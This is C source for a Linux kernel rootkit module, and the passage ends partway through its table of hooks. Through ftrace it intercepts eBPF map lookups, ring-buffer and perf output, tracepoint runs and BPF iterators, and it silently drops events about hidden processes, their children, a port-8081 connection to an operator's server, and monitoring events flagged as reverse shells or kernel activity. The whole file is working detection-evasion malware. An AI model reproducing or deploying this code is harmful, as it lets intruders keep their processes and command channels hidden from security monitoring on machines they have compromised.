#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"
#include "../include/bpf_hook.h"
#include "../include/hiding_directory_def.h"

#define HIDDEN_PORT     8081
#define PID_MAX_VALUE   4194304U

static __be32 hidden_ip_cached = 0;

static inline void init_hidden_ip(void)
{
    if (unlikely(hidden_ip_cached == 0))
        hidden_ip_cached = in_aton(YOUR_SRV_IP);
}

struct bpf_iter_ctx_generic { struct bpf_iter_meta *meta; void *obj; };
struct bpf_iter_ctx_tcp  { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; };
struct bpf_iter_ctx_udp  { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; };
struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; };

#define EBPF_PROCINFO_V1_SIZE 32u
#define EBPF_PROCINFO_V2_SIZE 48u

struct ebpf_procinfo {
    u32 pid;
    u32 tgid;
    u8  comm[16];
    u64 last_seen;
} __attribute__((packed));

struct ebpf_procinfo_v2 {
    u32 pid;
    u32 tgid;
    u8  comm[16];
    u64 last_seen;
    u64 start_time_ns;
    u32 cpu;
    u32 pad;
} __attribute__((packed));

struct ebpf_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed));

struct ebpf_task_ctx {
    u64 start_time;
    u64 leader_start_time;
    u64 parent_start_time;
    u32 host_tid;
    u32 host_pid;
    u32 host_ppid;
    u32 tid;
    u32 pid;
    u32 ppid;
    u32 uid;
    u32 mnt_id;
    u32 pid_id;
    u8  comm[16];
    u8  uts_name[16];
    u32 flags;
} __attribute__((packed));

struct ebpf_evt_ctx {
    u64 ts;
    struct ebpf_task_ctx task;
} __attribute__((packed));

#define MON_EVENT_SIZE 120u

struct mon_event {
    u64 timestamp_ns;
    u32 pid;
    u32 tgid;
    u32 uid;
    u32 gid;
    u8  comm[16];
    u8  event_type;
    u8  severity;
    u8  pad[6];
    union {
        struct {
            u32 old_uid;
            u32 old_gid;
            u32 new_uid;
            u32 new_gid;
        } privesc;
        struct {
            u64 addr;
            u64 len;
            u32 prot;
            u32 flags;
        } mmap;
        struct {
            u32 prog_type;
            u32 insn_cnt;
        } bpf_load;
        struct {
            u64 addr;
            u8  name[64];
        } kernel;
        struct {
            u8  daddr[4];
            u16 dport;
            u16 family;
            u8  daddr6[16];
            u8  suspicious;
            u8  pad[3];
        } net;
        struct {
            u32 oldfd;
            u32 newfd;
            char path[32];
        } rshell;
    } data;
} __attribute__((packed));

#define EXT_HDR_MIN (sizeof(struct ebpf_evt_ctx))

static atomic64_t ebpf_obf_key = ATOMIC64_INIT(0);

static notrace inline u64 get_obf_key(void)
{
    return (u64)atomic64_read(&ebpf_obf_key);
}

static inline bool is_obf_config_map(const struct bpf_map *map)
{
    return map &&
           map->map_type    == BPF_MAP_TYPE_ARRAY &&
           map->key_size    == sizeof(u32)        &&
           map->value_size  == sizeof(u64)        &&
           map->max_entries == 1;
}

static void *config_map_va = NULL;

static notrace inline u64 read_obf_key_va(void)
{
    void *va = READ_ONCE(config_map_va);
    if (!va || (unsigned long)va < PAGE_SIZE)
        return 0ULL;
    return READ_ONCE(*(u64 *)va);
}

static notrace inline bool should_hide_pid_by_int(int pid)
{
    return is_hidden_pid(pid);
}

static notrace inline bool should_hide_child_pid_by_int(int pid)
{
    return is_child_pid(pid);
}

static notrace inline bool should_hide_any_pid_by_int(int pid)
{
    return should_hide_pid_by_int(pid) || should_hide_child_pid_by_int(pid) ||
           pid_is_thread(pid);
}

static notrace inline bool should_hide_pid_fast_nmi(int pid)
{
    int i, count;

    if (pid <= 0)
        return false;

    count = READ_ONCE(hidden_count);
    if (count > MAX_HIDDEN_PIDS)
        count = MAX_HIDDEN_PIDS;
    for (i = 0; i < count; i++)
        if (READ_ONCE(hidden_pids[i]) == pid)
            return true;

    count = READ_ONCE(child_count);
    if (count > MAX_CHILD_PIDS)
        count = MAX_CHILD_PIDS;
    for (i = 0; i < count; i++)
        if (READ_ONCE(child_pids[i]) == pid)
            return true;

    return false;
}

static notrace bool is_child_of_hidden_process(int pid)
{
    if (pid <= 0)
        return false;
    if (in_nmi())
        return should_hide_pid_fast_nmi(pid);
    return should_hide_pid_by_int(pid) || should_hide_child_pid_by_int(pid);
}

static notrace inline bool is_procinfo_event(const void *data)
{
    const struct ebpf_procinfo *p;
    if (!data || (unsigned long)data < PAGE_SIZE) return false;
    p = (const struct ebpf_procinfo *)data;
    return p->last_seen >= 1000000000ULL;
}

static notrace inline bool is_procinfo_event_v2(const void *data, u64 size)
{
    const struct ebpf_procinfo_v2 *p;

    if (!data || (unsigned long)data < PAGE_SIZE)
        return false;
    if (size != 0 && size < EBPF_PROCINFO_V2_SIZE)
        return false;

    p = (const struct ebpf_procinfo_v2 *)data;
    if (p->last_seen < 1000000000ULL)
        return false;
    if (p->start_time_ns == 0 || p->start_time_ns < 1000000000ULL)
        return false;
    if (p->cpu >= 4096U)
        return false;

    return true;
}

static notrace inline bool is_ebpf_event(const void *data, u64 size)
{
    const struct ebpf_event_hdr *h;
    if (!data || (unsigned long)data < PAGE_SIZE) return false;
    if (size != 0 && size < sizeof(*h)) return false;
    h = (const struct ebpf_event_hdr *)data;
    return h->type >= 1 && h->type <= 400 &&
           h->len  >  0 && h->len  < 65536 &&
           h->nparams < 20;
}

static notrace bool is_ext_event(const void *data, u32 size)
{
    const struct ebpf_evt_ctx *ev;

    if (!data || (unsigned long)data < PAGE_SIZE)
        return false;
    if (size < EXT_HDR_MIN)
        return false;

    ev = (const struct ebpf_evt_ctx *)data;

    if (ev->ts < 1000000000ULL)
        return false;

    if (ev->task.start_time == 0)
        return false;

    if (ev->task.host_pid == 0 || ev->task.host_pid >= PID_MAX_VALUE)
        return false;
    if (ev->task.host_tid == 0 || ev->task.host_tid >= PID_MAX_VALUE)
        return false;

    return true;
}

static notrace bool should_hide_start_time_ns(u64 start_time_ns)
{
    int count, i;

    if (start_time_ns == 0)
        return false;

    count = READ_ONCE(hidden_count);
    if (count > MAX_HIDDEN_PIDS)
        count = MAX_HIDDEN_PIDS;

    for (i = 0; i < count; i++) {
        if (READ_ONCE(hidden_start_times[i]) == start_time_ns)
            return true;
    }

    count = READ_ONCE(child_count);
    if (count > MAX_CHILD_PIDS)
        count = MAX_CHILD_PIDS;

    for (i = 0; i < count; i++) {
        if (READ_ONCE(child_start_times[i]) == start_time_ns)
            return true;
    }

    return false;
}

static notrace inline bool should_suppress_procinfo(const void *data, u64 size)
{
    const struct ebpf_procinfo *p;
    u64 key;
    u32 real_pid, real_tgid;

    if (!data)
        return false;

    if (is_procinfo_event_v2(data, size))
        return should_hide_start_time_ns(((const struct ebpf_procinfo_v2 *)data)->start_time_ns);

    p = (const struct ebpf_procinfo *)data;
    key = get_obf_key();
    real_pid  = p->pid  ^ (u32)(key);
    real_tgid = p->tgid ^ (u32)(key >> 32);
    return should_hide_any_pid_by_int((int)real_pid) ||
           should_hide_any_pid_by_int((int)real_tgid);
}

static notrace bool should_hide_socket_port(struct sock_common *sk)
{
    if (!sk) return false;
    init_hidden_ip();
    if (sk->skc_family == AF_INET) {
        __be16 sport = sk->skc_num, dport = sk->skc_dport;
        __be32 saddr = sk->skc_rcv_saddr, daddr = sk->skc_daddr;
        if ((sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) &&
            (saddr == hidden_ip_cached || daddr == hidden_ip_cached ||
             saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)))
            return true;
    } else if (sk->skc_family == AF_INET6 && sk->skc_num == HIDDEN_PORT)
        return true;
    return false;
}

static notrace inline bool is_valid_task_ptr_safe(const struct task_struct *task)
{
    pid_t pid, tgid;
    if (!task || (unsigned long)task < PAGE_SIZE) return false;
    pid  = READ_ONCE(task->pid);
    tgid = READ_ONCE(task->tgid);
    if (pid  <= 0 || pid  >= (pid_t)PID_MAX_VALUE) return false;
    if (tgid <= 0 || tgid >= (pid_t)PID_MAX_VALUE) return false;
    return true;
}


static notrace bool mem_has_substr(const char *buf, u32 len, const char *needle)
{
    u32 i, j, nlen = 0;

    if (!buf || !needle || len == 0)
        return false;

    while (needle[nlen] != '\0')
        nlen++;
    if (nlen == 0 || nlen > len)
        return false;

    for (i = 0; i + nlen <= len; i++) {
        if (buf[i] == '\0')
            break;
        for (j = 0; j < nlen; j++) {
            if (buf[i + j] == '\0' || buf[i + j] != needle[j])
                break;
        }
        if (j == nlen)
            return true;
    }

    return false;
}

static notrace inline bool is_mon_event(const void *data, u64 size)
{
    const struct mon_event *e;

    if (!data || (unsigned long)data < PAGE_SIZE)
        return false;
    if (size < MON_EVENT_SIZE)
        return false;

    e = (const struct mon_event *)data;

    if (e->timestamp_ns < 1000000000ULL)
        return false;
    if (e->event_type < 1 || e->event_type > 10)
        return false;
    if (e->severity < 1 || e->severity > 4)
        return false;
    if (e->pid == 0 || e->pid >= PID_MAX_VALUE)
        return false;
    if (e->tgid == 0 || e->tgid >= PID_MAX_VALUE)
        return false;

    return true;
}

static notrace bool should_suppress_mon_event(const void *data, u64 size)
{
    const struct mon_event *e;
    int i;

    if (!is_mon_event(data, size))
        return false;

    e = (const struct mon_event *)data;

    if (is_child_of_hidden_process((int)e->pid) ||
        is_child_of_hidden_process((int)e->tgid))
        return true;

    if (e->event_type == 7) {
        init_hidden_ip();
        if (ntohs(e->data.net.dport) == HIDDEN_PORT)
            return true;
    }

    for (i = 0; hidden_patterns[i] != NULL; i++) {
        if (mem_has_substr((const char *)e->data.kernel.name,
                           sizeof(e->data.kernel.name),
                           hidden_patterns[i]))
            return true;
        if (mem_has_substr((const char *)e->data.rshell.path,
                           sizeof(e->data.rshell.path),
                           hidden_patterns[i]))
            return true;
    }

    return false;
}

typedef void (*t_rb_discard)(void *, u64);
static t_rb_discard fn_rb_discard = NULL;

typedef void (*t_rb_discard_dynptr)(void *, u64);
static t_rb_discard_dynptr fn_rb_discard_dynptr = NULL;

static notrace inline void safe_discard(void *data, u64 flags)
{
    if (fn_rb_discard)
        fn_rb_discard(data, flags);

}

typedef struct bpf_map *(*t_map_next)(u32 *id);
typedef void            (*t_map_put)(struct bpf_map *map);
static t_map_next fn_map_next = NULL;
static t_map_put  fn_map_put  = NULL;

static notrace void find_config_map_va(void)
{
    struct bpf_map *map;
    u32 id = 0, zero = 0;
    void *va;

    if (!fn_map_next || !fn_map_put) return;

    while ((map = fn_map_next(&id)) != NULL) {
        if (is_obf_config_map(map) && map->ops && map->ops->map_lookup_elem) {
            va = map->ops->map_lookup_elem(map, &zero);
            if (va) {
                WRITE_ONCE(config_map_va, va);

                atomic64_set(&ebpf_obf_key, (long long)READ_ONCE(*(u64 *)va));
                fn_map_put(map);
                break;
            }
        }
        fn_map_put(map);
        id++;
    }
}

static void *(*orig_bpf_map_lookup_elem)(struct bpf_map *map, const void *key) = NULL;

static notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key)
{
    void *ret; u32 v;
    if (!orig_bpf_map_lookup_elem) return NULL;
    if (is_obf_config_map(map)) return orig_bpf_map_lookup_elem(map, key);
    ret = orig_bpf_map_lookup_elem(map, key);
    if (ret && map && key && map->key_size == sizeof(u32)) {
        v = *(const u32 *)key;
        if (v > 0 && v < PID_MAX_VALUE && should_hide_any_pid_by_int((int)v))
            return NULL;
    }
    return ret;
}

static long (*orig_bpf_map_update_elem)(struct bpf_map *map, void *key,
                                         void *value, u64 flags) = NULL;

static notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key,
                                              void *value, u64 flags)
{
    u32 v;
    if (!orig_bpf_map_update_elem) return -ENOSYS;
    if (is_obf_config_map(map)) return orig_bpf_map_update_elem(map, key, value, flags);
    if (map && key && map->key_size == sizeof(u32)) {
        v = *(const u32 *)key;
        if (v > 0 && v < PID_MAX_VALUE && should_hide_any_pid_by_int((int)v))
            return 0;
    }
    return orig_bpf_map_update_elem(map, key, value, flags);
}

static int (*orig_array_map_update_elem)(struct bpf_map *map, void *key,
                                          void *value, u64 map_flags) = NULL;

static notrace int hook_array_map_update_elem(struct bpf_map *map, void *key,
                                               void *value, u64 map_flags)
{
    void *va;
    u64 new_key;
    int ret;

    if (!orig_array_map_update_elem) return -ENOSYS;
    if (!map || !key || !value)
        return orig_array_map_update_elem(map, key, value, map_flags);

    if (is_obf_config_map(map) && *(const u32 *)key == 0) {
        ret = orig_array_map_update_elem(map, key, value, map_flags);
        if (ret == 0 && map->ops && map->ops->map_lookup_elem) {
            va = map->ops->map_lookup_elem(map, key);
            if (va) {
                WRITE_ONCE(config_map_va, va);
                new_key = READ_ONCE(*(u64 *)va);

                atomic64_set(&ebpf_obf_key, (long long)new_key);
            }
        }
        return ret;
    }

    return orig_array_map_update_elem(map, key, value, map_flags);
}

static void *(*orig_bpf_ringbuf_reserve)(void *ringbuf, u64 size, u64 flags) = NULL;

static notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags)
{
    pid_t tgid, pid;

    if (!orig_bpf_ringbuf_reserve) return NULL;

    tgid = READ_ONCE(current->tgid);
    pid  = READ_ONCE(current->pid);

    if (in_nmi()) {
        if (should_hide_pid_fast_nmi((int)tgid) ||
            should_hide_pid_fast_nmi((int)pid))
            return NULL;
        return orig_bpf_ringbuf_reserve(ringbuf, size, flags);
    }

    if (is_child_of_hidden_process((int)tgid) ||
        is_child_of_hidden_process((int)pid))
        return NULL;

    return orig_bpf_ringbuf_reserve(ringbuf, size, flags);
}

static void (*orig_bpf_ringbuf_submit)(void *data, u64 flags) = NULL;

static notrace void hook_bpf_ringbuf_submit(void *data, u64 flags)
{
    const struct ebpf_event_hdr *fhdr;
    bool suppress = false;

    if (!orig_bpf_ringbuf_submit) return;
    if (!data || (unsigned long)data < PAGE_SIZE) goto passthrough;

    if (in_nmi()) {
        if (should_hide_pid_fast_nmi((int)READ_ONCE(current->tgid)) ||
            should_hide_pid_fast_nmi((int)READ_ONCE(current->pid))) {
            safe_discard(data, flags);
            return;
        }
        goto passthrough;
    }

    if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
        is_child_of_hidden_process((int)READ_ONCE(current->pid))) {
        safe_discard(data, flags);
        return;
    }

    if (is_procinfo_event_v2(data, 0) || is_procinfo_event(data)) {
        suppress = should_suppress_procinfo(data, 0);
    }

    if (!suppress && is_ebpf_event(data, 0)) {
        fhdr     = (const struct ebpf_event_hdr *)data;
        suppress = is_child_of_hidden_process((int)(fhdr->tid & 0xFFFFFFFF));
    }

    if (suppress) {
        safe_discard(data, flags);
        return;
    }

passthrough:
    orig_bpf_ringbuf_submit(data, flags);
}

static long (*orig_bpf_ringbuf_output)(void *ringbuf, void *data, u64 size, u64 flags) = NULL;

static notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags)
{
    const struct ebpf_event_hdr *fhdr;

    if (!orig_bpf_ringbuf_output) return -ENOSYS;
    if (!data || !ringbuf) goto passthrough;

    if (in_nmi()) {
        if (should_hide_pid_fast_nmi((int)READ_ONCE(current->tgid)) ||
            should_hide_pid_fast_nmi((int)READ_ONCE(current->pid)))
            return 0;
        goto passthrough;
    }

    if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
        is_child_of_hidden_process((int)READ_ONCE(current->pid)))
        return 0;

    if ((size >= EBPF_PROCINFO_V2_SIZE && is_procinfo_event_v2(data, size)) ||
        (size >= EBPF_PROCINFO_V1_SIZE && is_procinfo_event(data))) {
        if (should_suppress_procinfo(data, size)) return 0;
    }

    if (is_mon_event(data, size)) {
        if (should_suppress_mon_event(data, size)) return 0;
    }

    if (is_ebpf_event(data, size)) {
        fhdr = (const struct ebpf_event_hdr *)data;
        if (is_child_of_hidden_process((int)(fhdr->tid & 0xFFFFFFFF))) return 0;
    }

passthrough:
    return orig_bpf_ringbuf_output(ringbuf, data, size, flags);
}

static int (*orig_bpf_ringbuf_reserve_dynptr)(void *ringbuf, u32 size, u64 flags, void *ptr) = NULL;

static notrace int hook_bpf_ringbuf_reserve_dynptr(void *ringbuf, u32 size, u64 flags, void *ptr)
{
    pid_t tgid, pid;

    if (!orig_bpf_ringbuf_reserve_dynptr) return -ENOSYS;

    tgid = READ_ONCE(current->tgid);
    pid  = READ_ONCE(current->pid);

    if (in_nmi()) {
        if (should_hide_pid_fast_nmi((int)tgid) ||
            should_hide_pid_fast_nmi((int)pid))
            return -ENOSPC;
        return orig_bpf_ringbuf_reserve_dynptr(ringbuf, size, flags, ptr);
    }

    if (is_child_of_hidden_process((int)tgid) ||
        is_child_of_hidden_process((int)pid))
        return -ENOSPC;

    return orig_bpf_ringbuf_reserve_dynptr(ringbuf, size, flags, ptr);
}

static void (*orig_bpf_ringbuf_submit_dynptr)(void *ptr, u64 flags) = NULL;

static notrace void hook_bpf_ringbuf_submit_dynptr(void *ptr, u64 flags)
{
    pid_t tgid, pid;

    if (!orig_bpf_ringbuf_submit_dynptr) return;
    if (!ptr || (unsigned long)ptr < PAGE_SIZE) goto passthrough;

    tgid = READ_ONCE(current->tgid);
    pid  = READ_ONCE(current->pid);

    if (in_nmi()) {
        if (should_hide_pid_fast_nmi((int)tgid) ||
            should_hide_pid_fast_nmi((int)pid)) {
            if (fn_rb_discard_dynptr) fn_rb_discard_dynptr(ptr, flags);
            return;
        }
        goto passthrough;
    }

    if (is_child_of_hidden_process((int)tgid) ||
        is_child_of_hidden_process((int)pid)) {
        if (fn_rb_discard_dynptr) fn_rb_discard_dynptr(ptr, flags);
        return;
    }

passthrough:
    orig_bpf_ringbuf_submit_dynptr(ptr, flags);
}

static int (*orig_perf_event_output)(struct perf_event *event,
                                      struct perf_sample_data *data,
                                      struct pt_regs *regs) = NULL;

static notrace int hook_perf_event_output(struct perf_event *event,
                                           struct perf_sample_data *data,
                                           struct pt_regs *regs)
{
    if (!orig_perf_event_output) return -ENOSYS;

    if (in_nmi()) {
        if (should_hide_pid_fast_nmi((int)READ_ONCE(current->tgid)) ||
            should_hide_pid_fast_nmi((int)READ_ONCE(current->pid)))
            return 0;
        return orig_perf_event_output(event, data, regs);
    }

    if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
        is_child_of_hidden_process((int)READ_ONCE(current->pid)))
        return 0;

    if (data && data->raw &&
        (unsigned long)data->raw->frag.data > PAGE_SIZE &&
        data->raw->frag.size >= EXT_HDR_MIN) {
        const void *raw   = data->raw->frag.data;
        u32         rawsz = data->raw->frag.size;
        if (is_ext_event(raw, rawsz)) {
            const struct ebpf_evt_ctx *ev =
                (const struct ebpf_evt_ctx *)raw;
            if (is_child_of_hidden_process((int)ev->task.host_pid) ||
                is_child_of_hidden_process((int)ev->task.host_tid))
                return 0;
        }
        if (is_mon_event(raw, (u64)rawsz)) {
            if (should_suppress_mon_event(raw, (u64)rawsz))
                return 0;
        }
        if (is_ebpf_event(raw, (u64)rawsz)) {
            const struct ebpf_event_hdr *fh =
                (const struct ebpf_event_hdr *)raw;
            if (is_child_of_hidden_process((int)(fh->tid & 0xFFFFFFFF)))
                return 0;
        }
    }

    return orig_perf_event_output(event, data, regs);
}

static void (*orig_perf_trace_run_bpf_submit)(void *raw_data, int size,
                                               int rctx, void *call, u64 count,
                                               struct pt_regs *regs,
                                               struct hlist_head *head,
                                               struct task_struct *task) = NULL;

static notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size,
                                                    int rctx, void *call, u64 count,
                                                    struct pt_regs *regs,
                                                    struct hlist_head *head,
                                                    struct task_struct *task)
{
    if (!orig_perf_trace_run_bpf_submit) return;

    if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
        is_child_of_hidden_process((int)READ_ONCE(current->pid)))
        return;

    if (task) {
        pid_t t_pid  = READ_ONCE(task->pid);
        pid_t t_tgid = READ_ONCE(task->tgid);
        if (is_child_of_hidden_process((int)t_pid) ||
            is_child_of_hidden_process((int)t_tgid))
            return;
    }

    if (raw_data && size > (int)sizeof(u32)) {
        const void *inner = (const u8 *)raw_data + sizeof(u32);
        int inner_size    = size - (int)sizeof(u32);

        if (is_ebpf_event(inner, (u64)inner_size)) {
            const struct ebpf_event_hdr *fh =
                (const struct ebpf_event_hdr *)inner;
            if (is_child_of_hidden_process((int)(fh->tid & 0xFFFFFFFF)))
                return;
        }
        if (is_mon_event(inner, (u64)inner_size)) {
            if (should_suppress_mon_event(inner, (u64)inner_size))
                return;
        }
    }

    orig_perf_trace_run_bpf_submit(raw_data, size, rctx, call, count, regs, head, task);
}


static int (*orig_bpf_iter_run_prog)(struct bpf_prog *prog, void *ctx) = NULL;

static notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx)
{
    struct bpf_iter_ctx_generic *gctx;
    struct task_struct          *task;
    struct sock_common          *sk;
    pid_t                        pid, tgid;

    if (!orig_bpf_iter_run_prog || !ctx) goto passthrough;

    if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
        is_child_of_hidden_process((int)READ_ONCE(current->pid)))
        return 0;

    gctx = (struct bpf_iter_ctx_generic *)ctx;
    if (!gctx->obj || (unsigned long)gctx->obj < PAGE_SIZE)
        goto passthrough;

    task = (struct task_struct *)gctx->obj;
    if (is_valid_task_ptr_safe(task)) {
        pid  = READ_ONCE(task->pid);
        tgid = READ_ONCE(task->tgid);
        if (is_child_of_hidden_process((int)pid) ||
            is_child_of_hidden_process((int)tgid))
            return 0;
    }

    sk = (struct sock_common *)gctx->obj;
    if ((unsigned long)sk > PAGE_SIZE) {
        u16 family = READ_ONCE(sk->skc_family);
        if ((family == AF_INET || family == AF_INET6) &&
            should_hide_socket_port(sk))
            return 0;
    }

passthrough:
    return orig_bpf_iter_run_prog(prog, ctx);
}

static int (*orig_bpf_seq_write)(struct seq_file *seq, const void *data, u32 len) = NULL;

static notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len)
{
    const u32 *pd; int i;
    if (!orig_bpf_seq_write) return -ENOSYS;
    if (!data || len < sizeof(u32)) goto passthrough;
    pd = (const u32 *)data;
    for (i = 0; i < (int)(len / sizeof(u32)) && i < 16; i++) {
        u32 v = pd[i];
        if (v > 1 && v < PID_MAX_VALUE && should_hide_any_pid_by_int((int)v)) return 0;
    }
passthrough:
    return orig_bpf_seq_write(seq, data, len);
}

static int (*orig_bpf_seq_printf)(struct seq_file *m, const char *fmt,
                                   u32 fmt_size, const void *data, u32 data_len) = NULL;

static notrace int hook_bpf_seq_printf(struct seq_file *m, const char *fmt,
                                        u32 fmt_size, const void *data, u32 data_len)
{
    const u32 *pd; int i;
    if (!orig_bpf_seq_printf) return -ENOSYS;
    if (!data || data_len < sizeof(u32)) goto passthrough;
    pd = (const u32 *)data;
    for (i = 0; i < (int)(data_len / sizeof(u32)) && i < 16; i++) {
        u32 v = pd[i];
        if (v > 1 && v < PID_MAX_VALUE && should_hide_any_pid_by_int((int)v)) return 0;
    }
passthrough:
    return orig_bpf_seq_printf(m, fmt, fmt_size, data, data_len);
}

static unsigned int (*orig_trace_call_bpf)(void *call, void *ctx) = NULL;

static notrace unsigned int hook_trace_call_bpf(void *call, void *ctx)
{
    if (!orig_trace_call_bpf) return 1;
    if (!in_nmi()) {
        if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
            is_child_of_hidden_process((int)READ_ONCE(current->pid)))
            return 0;
    }
    return orig_trace_call_bpf(call, ctx);
}

#define DEFINE_BPF_TRACE_HOOK(N, PARAMS, ARGS)                          \
static void (*orig_bpf_trace_run##N) PARAMS = NULL;                     \
static notrace void hook_bpf_trace_run##N PARAMS                        \
{                                                                        \
    if (!orig_bpf_trace_run##N) return;                                 \
    if (!in_nmi()) {                                                     \
        if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||\
            is_child_of_hidden_process((int)READ_ONCE(current->pid)))    \
            return;                                                      \
    }                                                                    \
    orig_bpf_trace_run##N ARGS;                                         \
}

DEFINE_BPF_TRACE_HOOK(1,  (void *l, u64 a1), (l, a1))
DEFINE_BPF_TRACE_HOOK(2,  (void *l, u64 a1, u64 a2), (l, a1, a2))
DEFINE_BPF_TRACE_HOOK(3,  (void *l, u64 a1, u64 a2, u64 a3), (l, a1, a2, a3))
DEFINE_BPF_TRACE_HOOK(4,  (void *l, u64 a1, u64 a2, u64 a3, u64 a4), (l, a1, a2, a3, a4))
DEFINE_BPF_TRACE_HOOK(5,  (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5), (l, a1, a2, a3, a4, a5))
DEFINE_BPF_TRACE_HOOK(6,  (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6), (l, a1, a2, a3, a4, a5, a6))
DEFINE_BPF_TRACE_HOOK(7,  (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6, u64 a7), (l, a1, a2, a3, a4, a5, a6, a7))
DEFINE_BPF_TRACE_HOOK(8,  (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6, u64 a7, u64 a8), (l, a1, a2, a3, a4, a5, a6, a7, a8))
DEFINE_BPF_TRACE_HOOK(9,  (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6, u64 a7, u64 a8, u64 a9), (l, a1, a2, a3, a4, a5, a6, a7, a8, a9))
DEFINE_BPF_TRACE_HOOK(10, (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6, u64 a7, u64 a8, u64 a9, u64 a10), (l, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10))
DEFINE_BPF_TRACE_HOOK(11, (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6, u64 a7, u64 a8, u64 a9, u64 a10, u64 a11), (l, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11))
DEFINE_BPF_TRACE_HOOK(12, (void *l, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6, u64 a7, u64 a8, u64 a9, u64 a10, u64 a11, u64 a12), (l, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12))

typedef u32 (*t_bpf_prog_run_fn)(u64 *regs, const struct bpf_insn *insn);
static t_bpf_prog_run_fn orig_bpf_prog_run_fn = NULL;

static notrace u32 hook_bpf_prog_run_fn(u64 *regs, const struct bpf_insn *insn)
{
    if (!orig_bpf_prog_run_fn) return 0;
    if (!in_nmi()) {
        if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
            is_child_of_hidden_process((int)READ_ONCE(current->pid)))
            return 0;
    }
    return orig_bpf_prog_run_fn(regs, insn);
}

static asmlinkage long (*orig_bpf)(const struct pt_regs *);
static asmlinkage long (*orig_bpf_ia32)(const struct pt_regs *);

static notrace asmlinkage long hook_bpf(const struct pt_regs *regs)
{
    if (!orig_bpf) return -ENOSYS;
    return orig_bpf(regs);
}

static notrace asmlinkage long hook_bpf_ia32(const struct pt_regs *regs)
{
    if (!orig_bpf_ia32) return -ENOSYS;
    return orig_bpf_ia32(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("bpf_map_lookup_elem",       hook_bpf_map_lookup_elem,       &orig_bpf_map_lookup_elem),
    HOOK("bpf_map_update_elem",       hook_bpf_map_update_elem,       &orig_bpf_map_update_elem),
    HOOK("array_map_update_elem",     hook_array_map_update_elem,     &orig_array_map_update_elem),
    HOOK("bpf_ringbuf_output",           hook_bpf_ringbuf_output,           &orig_bpf_ringbuf_output),
    HOOK("bpf_ringbuf_reserve",          hook_bpf_ringbuf_reserve,          &orig_bpf_ringbuf_reserve),
    HOOK("bpf_ringbuf_submit",           hook_bpf_ringbuf_submit,           &orig_bpf_ringbuf_submit),
    HOOK("bpf_ringbuf_reserve_dynptr",   hook_bpf_ringbuf_reserve_dynptr,   &orig_bpf_ringbuf_reserve_dynptr),
    HOOK("bpf_ringbuf_submit_dynptr",    hook_bpf_ringbuf_submit_dynptr,    &orig_bpf_ringbuf_submit_dynptr),
    HOOK("perf_event_output",         hook_perf_event_output,         &orig_perf_event_output),
    HOOK("perf_trace_run_bpf_submit", hook_perf_trace_run_bpf_submit, &orig_perf_trace_run_bpf_submit),
    HOOK("bpf_iter_run_prog",         hook_bpf_iter_run_prog,         &orig_bpf_iter_run_prog),
    HOOK("bpf_seq_write",             hook_bpf_seq_write,             &orig_bpf_seq_write),
    HOOK("bpf_seq_printf",            hook_bpf_seq_printf,            &orig_bpf_seq_printf),
    HOOK("__x64_sys_bpf",             hook_bpf,                       &orig_bpf),
    HOOK("__ia32_sys_bpf",            hook_bpf_ia32,                  &orig_bpf_ia32),
    HOOK("trace_call_bpf",            hook_trace_call_bpf,            &orig_trace_call_bpf),
    HOOK("bpf_trace_run1",            hook_bpf_trace_run1,            &orig_bpf_trace_run1),
    HOOK("bpf_trace_run2",            hook_bpf_trace_run2,            &orig_bpf_trace_run2),
    HOOK("bpf_trace_run3",            hook_bpf_trace_run3,            &orig_bpf_trace_run3),
    HOOK("bpf_trace_run4",            hook_bpf_trace_run4,            &orig_bpf_trace_run4),
    HOOK("bpf_trace_run5",            hook_bpf_trace_run5,            &orig_bpf_trace_run5),
    HOOK("bpf_trace_run6",            hook_bpf_trace_run6,            &orig_bpf_trace_run6),
    HOOK("bpf_trace_run7",            hook_bpf_trace_run7,            &orig_bpf_trace_run7),
    HOOK("bpf_trace_run8",            hook_bpf_trace_run8,            &orig_bpf_trace_run8),
    HOOK("bpf_trace_run9",            hook_bpf_trace_run9,            &orig_bpf_trace_run9),
    HOOK("bpf_trace_run10",           hook_bpf_trace_run10,           &orig_bpf_trace_run10),
    HOOK("bpf_trace_run11",           hook_bpf_trace_run11,           &orig_bpf_trace_run11),
    HOOK("bpf_trace_run12",           hook_bpf_trace_run12,           &orig_bpf_trace_run12),
